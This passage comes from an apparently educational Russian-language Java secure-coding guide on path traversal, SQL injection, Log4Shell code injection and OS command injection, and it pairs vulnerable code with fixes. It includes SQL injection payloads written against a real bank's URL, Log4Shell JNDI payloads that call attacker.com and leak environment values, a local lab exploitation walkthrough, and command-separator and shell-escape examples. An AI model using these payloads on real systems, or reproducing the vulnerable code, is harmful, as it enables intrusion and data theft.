    if (!checkFileName(fileName)) {
        throw new RuntimeException(String.format("Не валидное имя файла. %s", fileName));
    }
    fileName = fileName.replaceAll("\\.\\.", "");
    File copied = new File(System.getProperty("java.io.tmpdir") + "/" + fileName);
```

Еще больше примеров неправильного и правильного написания кода:
https://community.veracode.com/s/article/how-do-i-fix-cwe-73-external-control-of-file-name-or-path-in-java

Подробней о CWE:

* https://owasp.org/www-community/attacks/Path_Traversal
* https://portswigger.net/web-security/file-path-traversal
* https://learn.snyk.io/lesson/directory-traversal/

***

## 3. CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

![cwe-89_1.png](readme_img/cwe-89_1.png)

### 3.1. Описание

Внедрение SQL-кода (англ. SQL injection) — один из распространённых способов взлома сайтов и программ, работающих с
базами данных, основанный на внедрении в запрос произвольного SQL-кода.

Внедрение SQL, в зависимости от типа используемой СУБД и условий внедрения, может дать атакующему возможность выполнить
произвольный запрос к базе данных (например, прочитать содержимое любых таблиц, удалить, изменить или добавить данные),
получить возможность чтения и/или записи локальных файлов и выполнения произвольных команд на атакуемом сервере.

Атаки типа «внедрение SQL» становятся возможными, когда:

* вводимые пользователем данные не проверяются, не фильтруются или не очищаются;
* динамические запросы или не параметризованные вызовы без контекстного экранирования напрямую используются в
  интерпретаторе;

Предположим, что на стороне клиента формируется URL – запрос, в котором передаются параметры: логин и пароль
пользователя. На стороне сервера происходит извлечение этих параметров и их подстановка в SQL – запрос, выполняемый в
БД.

URL – запрос имеет следующий вид:
`http://money.cbr.ru/logon?login=user&passwd=12345`

Примеры возможных SQL инъекций:

1) Сворачивание условия WHERE к истинностному результату при любых значениях параметров.

**Запрос**: `http://money.cbr.ru/logon?login=user' or '1'='1&passwd=null' or '1'='1`

**SQL – код**: `SELECT * FROM users WHERE userName ='user’ OR '1' = '1' AND password='null' OR '1' = '1'`

**Результат:**

![cwe-89_2.png](readme_img/cwe-89_2.png)

2) Присоединение к запросу результатов другого запроса. Делается это через оператор UNION.

**Запрос**: `http://money.cbr.ru/logon?login=null&passwd=null ' UNION SELECT * FROM users WHERE '1'='1`

**SQL – код**: `SELECT * FROM users WHERE userName ='null' AND PASSWORD='null' UNION SELECT * FROM users`

Результат – успешный доступ к информации (аналогично рисунку 1).

3) Закомментирование части запроса.

**Запрос**: `http://money.cbr.ru/logon?login=user' -- &passwd=null`

**SQL – код**: `SELECT * FROM users WHERE userName = 'user' -- ' AND password = 'null'`

Результат – получен доступ к записи без указания пароля:

![cwe-89_3.png](readme_img/cwe-89_3.png)

### 3.2. Защитные меры

Для предотвращения SQL injection необходимо отказаться от написания динамических запросов или не допускать, чтобы
вводимые пользователем данные (потенциально содержащие вредоносный SQL) влияли на логику выполняемого запроса. Если
избежать использования динамически формируемых запросов не представляется возможным, необходимо применять защитные меры,
описанные ниже.

#### 3.2.1. Использование Prepared Statements

Класс `java.sql.Statement` используется для выполнения SQL-запросов. Существует три типа класса Statement, которые
являются как бы контейнерами для выполнения SQL-выражений через установленное соединение:

1. Statement, базовый;
2. PreparedStatement, унаследованный от Statement – параметризованные запросы;
3. CallableStatement, унаследованный от PreparedStatement – хранимые процедуры.

Все классы специализируются для выполнения различных типов запросов:

1. Statement предназначен для выполнения простых SQL-запросов без параметров; содержит базовые методы для выполнения
   запросов и извлечения результатов.
2. PreparedStatement используется для выполнения SQL-запросов с или без входных параметров; добавляет методы управления
   входными параметрами.
3. CallableStatement используется для вызовов хранимых процедур; добавляет методы для манипуляции выходными параметрами.

#### *Пример небезопасного использования класса Statement*

В данном примере запрос (query) формируется с помощью конкатенации строк: к SQL – команде добавляются введенные
пользователем логин и пароль.

```java
String query = "SELECT id, userName, email, cash FROM Wallets WHERE username = '"
        + loginForm.username() + "' AND password = '"
        + DigestUtils.md5Hex(loginForm.password()) + "'";

try (Connection connection = DriverManager.getConnection(url, sql_user, sql_password);
     Statement statement = connection.createStatement();
     ResultSet resultSet = statement.executeQuery(query)) {

    return ResponseEntity.ok("Query: " + query + "\n" +
            "Результат SQL запроса с помощью Statement:\n" + printResult(resultSet));
```

Подставив вместо обычного логина выражение `user' -- `, и введя любой пароль нам удается успешно получить запись из
таблицы:

![cwe-89_4.png](readme_img/cwe-89_4.png)

Подставив вместо обычного логина выражение `null' or '1'='1' -- `, и введя любой пароль нам удается успешно получить все
записи из таблицы, не обладая никакими знаниями о структуре и содержании БД:

![cwe-89_5.png](readme_img/cwe-89_5.png)

#### *Пример безопасного использования класса PreparedStatement*

```java
String query = "SELECT id, userName, email, cash FROM Wallets WHERE username = ? AND password = ?";

try (Connection connection = DriverManager.getConnection(url, sql_user, sql_password);
     PreparedStatement statement = connection.prepareStatement(query)) {

    statement.setString(1, loginForm.username());
    statement.setString(2, DigestUtils.md5Hex(loginForm.password()));

    ResultSet resultSet = statement.executeQuery();
    query = statement.toString().substring(query.indexOf(":") + 2);

    return ResponseEntity.ok("Query: " + query + "\n" +
            "Результат SQL запроса с помощью Prepared Statement:\n" + printResult(resultSet));
```

Подставив вместо обычного логина выражение `null' or '1'='1' -- `, и введя любой пароль, нам не удается получить данные
из таблицы. Все введенные значения вставляются в запрос с помощью метода `setString`. Он сам понимает, где нужны
кавычки, а где нет, и оборачивает ими все входные данные.

Принцип защиты от SQL – инъекций при использовании PreparedStatement:

При получении сервером SQL – запроса, он проходит следующие фазы (рисунок 4):

1. Парсинг и нормализация - на этом этапе запрос проверяется на синтаксис и семантику. Проверяется, существуют ли ссылки
   на таблицу и столбцы, используемые в запросе.
2. Компиляция - на этом этапе ключевые слова, используемые в запросе, например SELECT, FROM, WHERE и т.д., преобразуются
   в формат, понятный для машины. Это этап, на котором интерпретируется запрос и принимается решение о соответствующем
   действии.
3. Оптимизация запроса – определяется и выбирается лучший способ выполнения запроса.
4. Кэширование – выбранный на предыдущем этапе способ запоминается для ускорения повторного выполнения SQL – запроса.
5. Выполнение – на этом этапе выполняется SQL – запрос, и данные возвращаются пользователю в виде объекта ResultSet.

![cwe-89_6.png](readme_img/cwe-89_6.png)

Рисунок 4.

PreparedStatement не является готовым SQL – запросом, а содержит заполнители («плэйсхолдеры»), на место которых во время
выполнения подставляются данные.

При использовании PreparedStatement изменяется алгоритм выполнения SQL – запроса (рисунок 5):

Фазы 1 – 4 не меняются, однако, в 4 фазе производится кэширование запроса вместе с заполнителями. Запрос на этом этапе
уже скомпилирован и преобразован в машинно-понятный формат. Теперь во время выполнения, когда поступают данные,
предоставленные пользователем, предварительно скомпилированный запрос извлекается из кэша, а заполнители заменяются
данными, предоставленными пользователем. После того как заполнители заменяются пользовательскими данными, окончательный
запрос не компилируется / не интерпретируется снова, и механизм SQL Server обрабатывает пользовательские данные как
чистые данные, а не SQL, который необходимо анализировать или компилировать снова.

![cwe-89_7.png](readme_img/cwe-89_7.png)

Рисунок 5.

Подробнее - https://javabypatel.blogspot.com/2015/09/how-prepared-statement-in-java-prevents-sql-injection.html

#### 3.2.2. Использование хранимых процедур

Хранимые процедуры представляют собой набор команд SQL, которые могут компилироваться и храниться на сервере.
Особенностью процедур является то, что есть возможность передавать аргументы и выводить различные данные в зависимости
от аргумента. Процедура является сущностью SQL, которую создают один раз, а затем вызывают, передавая аргументы.

Разница между PreparedStatement и CallableStatement заключается в том, что код SQL для хранимой процедуры определяется и
сохраняется в самой базе данных, а затем вызывается из приложения. Оба этих метода имеют одинаковую эффективность в
предотвращении внедрения SQL-кода.

Пример безопасного использования класса `CallableStatement`:

На сервере MySQL в БД DB1 создана хранимая процедура `proc2`:

```sql
USE DB1;
DELIMITER //
CREATE PROCEDURE proc2 (login VARCHAR(20), passwd VARCHAR(20))
BEGIN
SELECT * FROM users
WHERE userName = login AND password_md5 = passwd;
END //
DELIMITER ;
```

Вызов: CALL `proc2`('user', '040b7cf4a55014e185813e0644502ea9')

Вызов хранимой процедуры proc2 в java:
```java
try {
   connection = DriverManager.getConnection(url, sql_user, sql_password);
   callableStatement = connection.prepareCall("{call proc2(?,?)}");
   callableStatement.setString(1, user.userName);
   callableStatement.setString(2, DigestUtils.md5Hex(user.password));
   resultSet = callableStatement.executeQuery();
   System.out.println("\nРезультат SQL запроса с помощью Callable Procedure:\n");

   while (resultSet.next()) {
      printResult(resultSet);
   }

} catch (SQLException e) {e.printStackTrace();}

```

#### 3.2.3. Проверка ввода по белому списку

В случаях, когда параметры SQL запроса могут принимать ограниченное число вариантов необходимо проверять вводимые данные
по белому списку и вставлять в запрос соответствующие вводимым данным значения, например:

```java
String value; //можно сделать enum/list и проверять на наличие value в enum
try {
    value = switch (user.userName) {
        case "Administrator" -> "admin";
        case "User" -> "user";
        case "Sanya" -> "sanek";
        case "User2" -> "user2";
        default -> throw new InputValidationException("Unexpected value provided for user " +
                "\"" + user.userName + "\"");
    };
} catch (InputValidationException e) {
    e.printStackTrace();
}

String query = "SELECT id, userName, email, cash FROM users2 WHERE userName = '" + value +
        "' AND password_md5 = '" + DigestUtils.md5Hex(user.password) + "'";
```

\* пример с аутентификационными данными показательный и в реальной жизни не применяется

Теперь при попытке подстановки SQL кода в имя пользователя запрос к БД не производится и выводится сообщение о
недопустимом значении параметра:

![cwe-89_8.png](readme_img/cwe-89_8.png)

#### 3.2.4. Экранирование всех вводимых пользователем данных

Этот метод следует использовать только в крайнем случае, когда невозможно применить вышеперечисленные варианты. Метод
заключается в том, что перед помещением пользовательского ввода в SQL запрос данные экранируются по правилам
используемой СУБД.

Каждая СУБД поддерживает одну или несколько схем экранирования символов, специфичных для определенных типов запросов.
Если экранировать весь вводимый пользователем ввод, используя правильную схему экранирования для используемой базы
данных, СУБД не будет путать этот ввод с кодом SQL, написанным разработчиком, что позволит избежать любых возможных
уязвимостей, связанных с внедрением SQL-кода.

Подробнее об экранировании специальных символов в SQL запросах см. в http://www.orafaq.com/wiki/SQL_FAQ#How_does_one_escape_special_characters_when_writing_SQL_queries.3F

Существуют готовые библиотеки для управления безопасностью web – приложений, например, OWASP Enterprise Security API (
ESAPI). Её классы содержат как готовые реализации множества алгоритмов (в т.ч. и для санитизации SQL запросов), так и
абстрактные методы, которые можно реализовать самостоятельно в зависимости от специфики приложения.

#### *Пример использования ESAPI:*

```java
MySQLCodec codec = new MySQLCodec(MySQLCodec.Mode.STANDARD);
Encoder encoder = ESAPI.encoder();

String query = "SELECT id, userName, email, cash FROM users2 WHERE userName = '" +
        encoder.encodeForSQL(codec, user.userName) + "' AND password_md5 = '" +
        DigestUtils.md5Hex(user.password) + "'";
```

Теперь входные данные (user.userName) декодированы в безопасный для MySQL вид, и их можно использовать в запросе с
помощью Statement, PreparedStatement или CallableStatement. Например, строка `user' or '1'='1' -- ` будет преобразована
в строку `user\' or \'1\'\=\'1\' \-\-`:

`SELECT id, userName, email, cash FROM users2 WHERE userName = 'user\' or \'1\'\=\'1\' \-\- ' AND password_md5 = ee11cbb19052e40b07aac0ca060c23ee`

### 3.3. Java Persistence API и Hibernate. HQL injection и JPQL injection

![cwe-89_10.png](readme_img/cwe-89_10.png)

JPA (Java Persistence API) это спецификация Java EE и Java SE, описывающая систему управления сохранением java объектов
в таблицы реляционных баз данных в удобном виде. Сама Java не содержит реализации JPA, однако есть существует много
реализаций данной спецификации от разных компаний (открытых и нет). Это не единственный способ сохранения java объектов
в базы данных (ORM систем), но один из самых популярных в Java мире.

![cwe-89_11.png](readme_img/cwe-89_11.png)

Hibernate одна из самых популярных открытых реализаций последней версии спецификации (JPA 2.1). То есть JPA только
описывает правила и API, а Hibernate реализует эти описания, впрочем, у Hibernate (как и у многих других реализаций JPA)
есть дополнительные возможности, не описанные в JPA (и не переносимые на другие реализации JPA).

Запросы, написанные на Hibernate Query Language (HQL) и Java Persistence Query Language (JPQL) так же могут содержать
SQL инъекции. Для предотвращения SQL инъекций рекомендуется использовать Named parameters, Positional parameters,
Criteria Query Parameters и т.д.

### 3.4. Примеры

#### *Пример 1. Небезопасное использование Hibernate Query Language (HQL)*
В данном примере SQL запрос строится при помощи конкатенации строк с использованием `javax.persistence.EntityManager`:
```java
@Autowired
private EntityManager em;

private static final String HQL_UNSAFE = "FROM Product t WHERE t.name='";

public List<Product> findByName_HQL_unsafe(String name) {
    return (List<Product>) em.createQuery(HQL_UNSAFE + name + "'").getResultList();
    //.getSingleResult() - усложнит, но не устранит инъекцию
}
```

#### *Пример 2. Небезопасное использование HQL*
В данном примере SQL запрос строится при помощи конкатенации строк. Используется перегруженный метод `<T> TypedQuery<T>
createQuery(String var1, Class<T> var2)`
```java
@Autowired
private EntityManager em;

private static final String HQL_UNSAFE = "FROM Product t WHERE t.name='";

public List<Product> findProductByClassName_HQL_unsafe(String name) {
    return (List<Product>) em.createQuery(HQL_UNSAFE + name + "'", Product.class).getResultList();
    //.getSingleResult() - усложнит, но не устранит инъекцию
}
```

#### *Пример 3. Небезопасное использование HQL*
В данном примере SQL запрос строится при помощи конкатенации строк с использованием `org.hibernate.Session`:
```java
private static final String HQL_UNSAFE = "FROM Product t WHERE t.name='";

private Session session = HibernateSessionFactory.getSessionFactory().openSession();


public List<Product> findByName_HQL_Session_unsafe(String name) {
    return session.createQuery(HQL_UNSAFE + name + "'").list();
}
```

#### *Пример 4. Безопасное использование HQL*
В данном примере SQL запрос строится при помощи Positional parameters:
```java
private static final String HQL_SAFETY = "FROM Product t WHERE t.name=?1";

public List<Product> findByName_HQL_safety(String name) {
    return (List<Product>) em.createQuery(HQL_SAFETY).setParameter(1, name).getResultList();
}
```

#### *Пример 5. Безопасное использование HQL*
В данном примере SQL запрос строится при помощи Named parameters:
```java
private static final String HQL_SAFETY_2 = "FROM Product t WHERE t.name = :paramName";

public List<Product> findByName_HQL_Session_safety(String name) {
    return session.createQuery(HQL_SAFETY_2).setParameter("paramName", name).list();
}
```

#### *Пример 6. Безопасное использование Java Persistence Query Language (JPQL)*
В данном примере строится нативный SQL запрос при помощи Positional parameters:
```java
public interface JpaProductRepository extends JpaRepository<Product, Integer> {

    // Native Query with Positional Parameters
    @Query(value = "SELECT * FROM Products t WHERE t.name LIKE ?1", nativeQuery = true)
    List<Product> findByName_JPQL_native(String name);
```

#### *Пример 7. Безопасное использование Java Persistence Query Language (JPQL)*
В данном примере SQL запрос строится при помощи Positional parameters:
```java
public interface JpaProductRepository extends JpaRepository<Product, Integer> {

    /*Positional Parameters: the parameters is referenced by their positions in the query
    (defined using ? followed by a number (?1, ?2, …).
    Spring Data JPA will automatically replace the value of each parameter in the same position.*/
    @Query("SELECT t FROM Product t WHERE t.name LIKE %?1%")
    List<Product> findByName_JPQL_pos_param(String name);
```

#### *Пример 8. Безопасное использование Java Persistence Query Language (JPQL)*
В данном примере SQL запрос строится при помощи Named parameters:
```java
public interface JpaProductRepository extends JpaRepository<Product, Integer> {

    // Named Parameters. A named parameter starts with : followed by the name of the parameter
    @Query("SELECT t FROM Product t WHERE t.name LIKE %:id%")
    List<Product> findByName_JPQL_name_param(@Param("id") String name);
```

#### *Пример 9. Безопасное использование JPA Criteria API*
В данном примере SQL запрос строится при помощи Criteria Query Parameters
```java
public List<Product> findByName_HQL_criteriaApi_safety(String name) {
    CriteriaBuilder cb = em.getCriteriaBuilder();
    CriteriaQuery<Product> cq = cb.createQuery(Product.class);
    Root<Product> root = cq.from(Product.class);
    cq.select(root).where(cb.equal(root.get(Product_.name), name));
    return em.createQuery(cq).getResultList();
}
```

#### *Пример 10. Небезопасное использование MyBatis*
Обратите внимание на обозначение параметра `${phone}` в приведенном ниже запросе. По умолчанию использование
синтаксиса `${}` приводит к тому, что MyBatis напрямую вводит не модифицированную строку в SQL-запрос. MyBatis НЕ
изменяет и не экранирует строку перед подстановкой.
```xml
<select id="getPerson" parameterType="string" resultType="com.example.cwe.sqli.entity.Person">
    SELECT * FROM PERSON WHERE NAME = #{name} AND PHONE LIKE '${phone}';
</select>
```

#### *Пример 11. Безопасное использование MyBatis*
Обратите внимание на обозначение параметра `#{id}`. По умолчанию использование синтаксиса `#{}` приводит к тому, что
MyBatis использует PreparedStatement для безопасной подстановки значений в SQL запрос.
```xml
<select id="getPerson" parameterType="int" resultType="com.example.cwe.sqli.entity.Person">
    SELECT * FROM PERSON WHERE ID = #{id}
</select>
```

#### *Пример 12. Небезопасное использование JPQL*

**_Not found._**

#### *Пример 13. Корректное использование – белый список*
```java
private static final Set<String> VALID_COLUMNS_FOR_ORDER_BY
        = Collections.unmodifiableSet(Stream
        .of("acc_number", "branch_id", "balance")
        .collect(Collectors.toCollection(HashSet::new)));

public List<AccountDTO> safeFindAccountsByCustomerId(String customerId, String orderBy) throws Exception {
    String sl = "select "
            + "customer_id,acc_number,branch_id,balance from Accounts"
            + "where customer_id = ? ";
    if (VALID_COLUMNS_FOR_ORDER_BY.contains(orderBy)) {
        sql = sql + " order by " + orderBy;
    } else {
        throw new IllegalArgumentException("Nice try!");
    }
    Connection c = dataSource.getConnection();
    PreparedStatement p = c.prepareStatement(sql);
    p.setString(1, customerId);
    // ... result set processing omitted
}
```

Еще больше примеров можно посмотреть на https://bobby-tables.com/java

### 3.5. В заключении

![cwe-89_12.png](readme_img/cwe-89_12.png)

### 3.6. Дополнительная литература

1. CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
   https://cwe.mitre.org/data/definitions/89.html
2. SQL injection для начинающих. Часть 1
   https://habr.com/ru/post/148151/
3. SQL Injection Prevention Cheat Sheet
   https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
4. Injection Prevention Cheat Sheet in Java¶
   https://cheatsheetseries.owasp.org/cheatsheets/Java_Security_Cheat_Sheet.html#injection-prevention-in-java
5. Input Validation Cheat Sheet
   https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
6. Enterprise Security API (ESAPI) Java
   https://www.denimgroup.com/media/pdfs/DenimGroup_ESAPI_SATJUG_20100603.pdf
7. Java Code Examples for org.owasp.esapi.ESAPI
   https://www.programcreek.com/java-api-examples/?api=org.owasp.esapi.ESAPI
8. How does one escape special characters when writing SQL queries?
   http://www.orafaq.com/wiki/SQL_FAQ#How_does_one_escape_special_characters_when_writing_SQL_queries.3F
9. JPA Query Parameters Usage
   https://www.baeldung.com/jpa-query-parameters

***

## 4. CWE-94: Improper Control of Generation of Code ('Code Injection')

Code Injection - это общий термин для типов атак, заключающихся в инъекции кода, который затем
интерпретируется/исполняется приложением.

Удаленное выполнение кода (RCE, Remote code execution) – это признанная OWASP уязвимость, которая позволяет
злоумышленникам удаленно запускать вредоносный код на целевой системе.

Этот тип атак использует плохую обработку недоверенных данных. Обычно такие атаки становятся возможными из-за отсутствия
надлежащей проверки входных/выходных данных, например:

* разрешенные символы (стандартные классы регулярных выражений или пользовательские)
* формат данных
* объем ожидаемых данных

Code Injection отличается от Command Injection тем, что злоумышленник ограничен только функциональностью самого
внедряемого языка. Если злоумышленник может внедрить PHP-код в приложение и добиться его выполнения, он ограничен только
возможностями PHP.

### 4.1. Class.forName

В Java, например, для выполнения произвольного кода может использоваться `Class.forName("className")`. Метод `forName`
используется для загрузки классов, неизвестных в момент компиляции. При загрузке класса автоматически выполняется код из
блока `static {}`, что дает возможность злоумышленнику выполнить любой код, например:

```java
public class evilClass {
    static {
        try {
            Runtime.getRuntime().exec("cmd /c calc.exe");
        } catch (IOException ignored) {
        }
    }
}

public class Main {
    public static void main(String[] args) throws ClassNotFoundException {
        System.out.println("Hello world!");
        Class.forName("org.example.evilClass");
    }
}
```

### 4.2. logger.*

Один из самых популярных примеров RCE это Log4j Log4Shell 0-Day Vulnerability. Данная CWE часто детектируется PT AI в
исходном коде приложений ППОД.

В Apache Log4j 2, популярном фреймворке для организации ведения логов в Java-приложениях, имеется критическая
уязвимость, позволяющая выполнить произвольный код при записи в лог специально оформленного значения в
формате `{jndi:URL}`. Атака может быть проведена на Java-приложения, записывающие в лог значения, полученные из внешних
источников, например, при выводе проблемных значений в сообщениях об ошибках.

Проблема была вызвана тем, что Log4j 2 поддерживает обработку специальных масок `{}` в выводимых в лог строках,
позволяющих выполнять различные lookups вида `${prefix:name}`, где name – вычисляемый параметр.
Например, `${java:version}` или `${jndi:ldap}`

Примеры Payloads:

```
# Identify Java version and hostname
${jndi:ldap://${java:version}.domain/a}
${jndi:ldap://${env:JAVA_VERSION}.domain/a}
${jndi:ldap://${sys:java.version}.domain/a}
${jndi:ldap://${sys:java.vendor}.domain/a}
${jndi:ldap://${hostName}.domain/a}
${jndi:dns://${hostName}.domain}

# More enumerations keywords and variables
java:os
docker:containerId
web:rootDir
bundle:config:db.password
```

JNDI, или же Java Naming and Directory Interface, представляет собой Java API для доступа к службам имен и каталогов.
Служба имен и каталогов — это система, которая управляет отображением множества имен во множестве объектов. Наиболее
наглядным примером такой службы является файловая система. В файловой системе мы взаимодействуем с именами файлов, за
которыми скрываются объекты — сами файлы в различных форматах. В службе имен и каталогов именованные объекты собраны в
древовидную структуру.

![cwe-94_1.png](readme_img/cwe-94_1.png)

JNDI нужен для того, чтобы мы могли из Java-кода получить Java-объект из некоторой "Регистратуры" объектов по его имени.
Из популярных примеров служб имен и каталогов (поддерживаемые JNDI) можно выделить LDAP, DNS, RMI и т.д.
Атака сводится к передаче строки с подстановкой `${jndi:ldap://attacker.com/a}`, при обработке которой Log4j 2 отправит
на сервер attacker.com LDAP-запрос пути к Java-классу. Возвращённый сервером атакующего путь (например, http://second-stage.attacker.com/Exploit.class) будет загружен и выполнен в контексте текущего процесса, что
позволяет атакующему добиться выполнения произвольного кода в системе с правами текущего приложения.

![cwe-94_2.png](readme_img/cwe-94_2.png)

Подробнее об RMI/LDAP сервере и схеме загрузки payload
см. https://www.veracode.com/blog/research/exploiting-jndi-injections-java

Пример кода:

```java

@RestController
public class VulnApp {
    private static final Logger logger = LogManager.getLogger("vulnApp");

    @GetMapping("/")
    public String index(@RequestHeader("X-Api-Version") String apiVersion) {
        logger.info("Received a request for API version " + apiVersion);
        return "Hello, world!";
    }
}
```

### *Пример эксплуатации уязвимости Log4Shell:*

1. Запустим уязвимое приложение https://github.com/christophetd/log4shell-vulnerable-app (исходник контроллера представлен выше):
```shell
docker run --name vulnerable-app --rm -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
```
2. Отправим запрос:
```shell
curl localhost:8080/ -H 'X-Api-version: ${java:version}'
```

![cwe-94_3.png](readme_img/cwe-94_3.png)

3. В логах на сервере появилась запись:
```commandline
2023-03-07 07:25:03.708  INFO 1 --- [nio-8080-exec-9] HelloWorld: Received a request for API version Java version 1.8.0_181
```

![cwe-94_4.png](readme_img/cwe-94_4.png)

4. Запустим JNDI-Exploit-Kit (https://github.com/pimps/JNDI-Exploit-Kit):  
`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "touch tmp/pwned1" -A "127.0.0.1"`  
где “C” – команда, “A” – IP, на котором будут висеть LDAP и RMI сервера.

![cwe-94_5.png](readme_img/cwe-94_5.png)

5. Отправим подготовленный запрос в уязвимое приложение:  
`curl localhost:8080/ -H 'X-Api-version: ${jndi:ldap://172.17.0.1:1389/ujkli2}'`
6. Проверяем, выполнилась ли команда:
`docker exec -it vulnerable-app ls tmp/`

![cwe-94_6.png](readme_img/cwe-94_6.png)

7. Profit!

#### 4.2.1. Условия для появления уязвимости:

* Java приложение использует log4j (Maven package log4j-core) версии 2.0.0-2.12.1 или 2.13.0-2.14.1
    * Версия 2.12.2 не подвержена уязвимости, так как получила исправления, перенесенные из версии 2.16.0.
* Злоумышленник может вызвать запись в журнал произвольных строк с помощью одного из API протоколирования –
  `logger.info()`, `logger.debug()`, `logger.error()`, `logger.fatal()`, `logger.log()`, `logger.trace()`, `logger.warn()`.
* Никаких специфических для Log4j мер по исправлению уязвимости не применяется (см. раздел “Mitigations”
  в https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/):
    * Отключение lookups
    * Удаление уязвимых классов
* (на некоторых машинах) Используемая версия Java JRE / JDK старше следующих версий: 6u211, 7u201, 8u191, 11.0.1

### 4.3. Защитные меры

Для предотвращения Code Injection необходимо:

1. Не допускать попадания пользовательского ввода в такие методы, как Class.forName и logger.info(), logger.debug(),
   logger.error(), logger.fatal(), logger.log(), logger.trace(), logger.warn();
2. Не использовать библиотеку log4j ниже версии 2.16.0, за исключением 2.12.2;
3. Если невозможно применить указанные в п.п. 1 и 2 меры, необходимо производить санитизацию/ валидацию передаваемых в
   методы пользовательских значений.

### 4.4. Дополнительная литература

Тренажер по данной CVE:
https://application.security/free-application-security-training/understanding-apache-log4j-vulnerability

Источники:

1. https://docs.oracle.com/javase/7/docs/api/java/lang/Class.html
2. https://russianblogs.com/article/9324971904/
3. https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/
4. https://www.veracode.com/blog/research/exploiting-jndi-injections-java
5. https://github.com/pimps/JNDI-Exploit-Kit
6. https://www.opennet.ru/opennews/art.shtml?num=56319
7. https://www.trendmicro.com/ru_ru/what-is/apache-log4j-vulnerability.html
8. https://www.kitploit.com/2022/02/jndi-injection-exploit-tool-which.html
9. https://qwiet.ai/log4shell-jndi-injection-via-attackable-log4j/
10. https://github.com/christophetd/log4shell-vulnerable-app

Полезные ссылки:

1. https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
2. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Log4Shell.md
3. https://github.com/fullhunt/log4j-scan
4. https://github.com/lucy9x/JNDI-Exploit-Kit
5. https://github.com/Jeromeyoung/JNDIExploit-1

***

## 5. CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')

![cwe-77_1.png](readme_img/cwe-77_1.png)

В данную категорию так же входят:

* CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
* CWE-88: Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')

### 5.1. Описание

Данные уязвимости обычно возникают, когда:

1. Данные попадают в приложение из недоверенного источника;
2. Данные являются частью строки, которая выполняется приложением как команда;
3. Выполнив команду, приложение предоставляет злоумышленнику привилегии или возможности, которых у него иначе не было
   бы.

Существует два основных подтипа OS Command Injection:

1. Внешние данные в качестве аргументов

Приложение выполняет фиксированную программу, которая находится под его контролем и принимает внешние данные в качестве
аргументов для этой программы.

_Пример:_ Программа использует вызов `system("nslookup [HOSTNAME]")` для запуска `nslookup`, а в качестве аргумента
пользователь указывает `HOSTNAME`. Хакер не может предотвратить выполнение `nslookup`, но, если программа не удаляет
разделители из аргумента `HOSTNAME`, переданного извне, злоумышленник может поместить разделители внутрь аргумента и
выполнить свою собственную команду.

В качестве разделителей могут использоваться:

Windows и Unix-based OS:
* &
* &&
* |
* ||

Только Unix-based OS:
* ;
* Newline (0x0a or \n)

Для вставки подзапроса в исходную команду используются символы `$` и \` :
* $(injected command)
* \`injected command\`

2. Внешние данные в качестве команды

Приложение использует входные данные для выбора программы для запуска и команд. Приложение дезинфицирует вводимые
данные, а затем просто перенаправляет всю команду операционной системе.
Пример: Приложение использует `exec([COMMAND])`, в то время как `[COMMAND]` поступает из внешнего источника. Хакер,
контролирующий аргумент `[COMMAND]`, может выполнять произвольные команды или программы в системе.

### 5.2. Потенциальное воздействие

Злоумышленник может использовать эту слабость для выполнения произвольных команд, раскрытия конфиденциальной информации
и отказа в обслуживании. Любые вредоносные действия будут исходить от уязвимого приложения и выполняться в контексте
безопасности этого приложения.

Пример эксплуатации:

Вводимый пользователем IP адрес подставляется в команду с помощью конкатенации строк.

```java

@GetMapping("/ping")
public String executePingCommand(@RequestParam String ip) throws IOException {
    String command = "cmd /c ping -n 1 " + ip;
    Process p = Runtime.getRuntime().exec(command);

    BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));

    String line;
    StringBuilder sb = new StringBuilder();

    while ((line = input.readLine()) != null) {
        sb.append(line).append("\n");
    }
    input.close();
    return sb.toString();
}
```

Используя разделитель `&` (`%26`) можно передать несколько произвольных команд:

![cwe-77_2.png](readme_img/cwe-77_2.png)

### 5.3. Защитные меры

#### 5.3.1. Стандартные библиотеки и функции Java

Самый эффективный способ предотвратить уязвимости инъекции команд ОС - никогда не обращаться к командам ОС из кода
прикладного уровня. Почти во всех случаях существуют различные способы реализации требуемой функциональности с помощью
более безопасных API-интерфейсов платформы.

Например, для вывода содержимого каталога вместо
```java
String comm = "cmd.exe /c dir " + user_path;
Process process = Runtime.getRuntime().exec(comm);
```
Используйте
```java
Files.list(new File(user_path).toPath()).limit(10).forEach(System.out::println);
```

#### 5.3.2. ProcessBuilder

Если выполнение команд ОС избежать невозможно, используйте java.lang.ProcessBuilder.

> Важно! Команда и каждый из аргументов должен передаваться отдельно. В таком случае, все, что следует за основной
> командой, будет расцениваться как аргументы, и экранироваться, в случае необходимости.

> Важно! Некоторые команды поддерживают параметры, позволяющие в качестве аргумента передавать и выполнять
> дополнительные команды. Например,
`find . -exec /bin/sh`
> или
`man man`
`!/bin/sh`
> Полный список таких команд представлен на ресурсе https://gtfobins.github.io/
> В случае необходимости использования одной из таких команд, необходимо дополнительно валидировать пользовательский
> ввод
> на предмет содержания параметров, позволяющих выполнять дополнительные команды.

#### *Пример 1. Некорректное использование*

В данном случае введенный пользователем IP конкатенируется с основной командой ping. В результате получившаяся строка
воспринимается как отдельная команда, а не команда с определенным и заранее известным набором аргументов, что позволяет
эксплуатировать слабость, используя разделители.

```java

@GetMapping("/pingPb1")
public String pingProcessUnsafe(@RequestParam String ip) throws IOException {
    ProcessBuilder pb = new ProcessBuilder("cmd", "/c", "ping -n 1 " + ip);
    Process p = pb.start();
```

#### *Пример 2. Корректное использование*

Не включайте аргументы команды в командную строку, вместо этого используйте параметризацию:

```java

@GetMapping("/pingPb2")
public String pingProcessSafe(@RequestParam String ip) throws IOException {
